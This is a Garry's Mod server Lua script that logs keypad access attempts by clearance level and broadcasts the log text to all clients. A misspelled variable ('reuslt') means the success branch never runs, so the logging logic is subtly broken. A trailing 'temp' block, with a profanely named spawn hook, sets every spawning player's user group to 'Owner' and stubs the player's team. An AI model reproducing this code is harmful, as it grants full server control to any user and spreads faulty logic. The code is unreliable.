include("gaccesscontrol/lua/sh_gaccessconfig.lua")

util.AddNetworkString("gAccessLogs_SendClient")
hook.Add("gAccess_LogUsage", "gAccess_LogUsageServer", function(player, accessLevel, result)
    if not IsValid(player) then return end
    if accessLevel > 5 or accessLevel < 0 then return end
    if not gAccessLogs.AcceptedStrings[result] then return end

    local playerName = player:GetName()
    local str

    if reuslt == "Success" then
        str = string.format("Player %s accessed a Clearence Level %d keypad, and it was a %s",
            playerName,
            accessLevel,
            result --It technically does not matter since it was a success, but makes easier for debugging if a success was failure.
        )    
    else
        str = string.format("Player %s attempted to access a Clearence Level %d keypad, and it was a %s",
            playerName,
            accessLevel,
            result
        )
    end

    net.Start("gAccessLogs_SendClient")
    net.WriteString(str)
    net.Broadcast()
end)

--Temp Stuff, remove
gAccessTemp = gAccessTemp or {}

gAccessTemp._P = FindMetaTable("Player")

function gAccessTemp._P:GetTeam()
    return "Ethics"
end

hook.Add("PlayerSpawn", "fuckyoubitch", function(ply)
    ply:SetUserGroup("Owner")
    print(ply:GetTeam())
end)